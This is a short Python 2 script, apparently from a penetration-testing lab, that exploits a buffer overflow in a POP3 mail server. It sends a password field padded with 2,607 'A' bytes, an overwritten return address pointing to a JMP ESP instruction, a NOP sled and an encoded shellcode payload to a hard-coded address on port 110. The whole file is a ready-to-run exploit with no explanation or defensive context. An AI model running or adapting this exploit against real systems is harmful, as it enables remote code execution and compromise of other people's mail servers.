import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#has the ExitProcess command in shellcode

shellcode = ("\xda\xc0\xd9\x74\x24\xf4\xbb\xdc\x1f\x63\xa1\x5d\x31\xc9\xb1"
"\x52\x83\xc5\x04\x31\x5d\x13\x03\x81\x0c\x81\x54\xc5\xdb\xc7"
"\x97\x35\x1c\xa8\x1e\xd0\x2d\xe8\x45\x91\x1e\xd8\x0e\xf7\x92"
"\x93\x43\xe3\x21\xd1\x4b\x04\x81\x5c\xaa\x2b\x12\xcc\x8e\x2a"
"\x90\x0f\xc3\x8c\xa9\xdf\x16\xcd\xee\x02\xda\x9f\xa7\x49\x49"
"\x0f\xc3\x04\x52\xa4\x9f\x89\xd2\x59\x57\xab\xf3\xcc\xe3\xf2"
"\xd3\xef\x20\x8f\x5d\xf7\x25\xaa\x14\x8c\x9e\x40\xa7\x44\xef"
"\xa9\x04\xa9\xdf\x5b\x54\xee\xd8\x83\x23\x06\x1b\x39\x34\xdd"
"\x61\xe5\xb1\xc5\xc2\x6e\x61\x21\xf2\xa3\xf4\xa2\xf8\x08\x72"
"\xec\x1c\x8e\x57\x87\x19\x1b\x56\x47\xa8\x5f\x7d\x43\xf0\x04"
"\x1c\xd2\x5c\xea\x21\x04\x3f\x53\x84\x4f\xd2\x80\xb5\x12\xbb"
"\x65\xf4\xac\x3b\xe2\x8f\xdf\x09\xad\x3b\x77\x22\x26\xe2\x80"
"\x45\x1d\x52\x1e\xb8\x9e\xa3\x37\x7f\xca\xf3\x2f\x56\x73\x98"
"\xaf\x57\xa6\x0f\xff\xf7\x19\xf0\xaf\xb7\xc9\x98\xa5\x37\x35"
"\xb8\xc6\x9d\x5e\x53\x3d\x76\x6b\xaf\x3d\x24\x03\xad\x3d\x29"
"\x6f\x38\xdb\x43\x9f\x6d\x74\xfc\x06\x34\x0e\x9d\xc7\xe2\x6b"
"\x9d\x4c\x01\x8c\x50\xa5\x6c\x9e\x05\x45\x3b\xfc\x80\x5a\x91"
"\x68\x4e\xc8\x7e\x68\x19\xf1\x28\x3f\x4e\xc7\x20\xd5\x62\x7e"
"\x9b\xcb\x7e\xe6\xe4\x4f\xa5\xdb\xeb\x4e\x28\x67\xc8\x40\xf4"
"\x68\x54\x34\xa8\x3e\x02\xe2\x0e\xe9\xe4\x5c\xd9\x46\xaf\x08"
"\x9c\xa4\x70\x4e\xa1\xe0\x06\xae\x10\x5d\x5f\xd1\x9d\x09\x57"
"\xaa\xc3\xa9\x98\x61\x40\xc9\x7a\xa3\xbd\x62\x23\x26\x7c\xef"
"\xd4\x9d\x43\x16\x57\x17\x3c\xed\x47\x52\x39\xa9\xcf\x8f\x33"
"\xa2\xa5\xaf\xe0\xc3\xef")
#the bytes that overwrite 
#This is the memory address where the jump esp is.
bufferd = 'A' * 2607 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" * (3500-2607-351-10-16)
try:
    print "Sending buffer"
    s.connect(('10.11.5.89',110)) #change the ip address and port number
    data = s.recv(1024)
    s.send('USER username'+'\r\n')
    data = s.recv(1024)
    s.send('PASS' + bufferd +'\r\n')
    print "\nDone!"
except:
    print "Could not connect to POP3!"
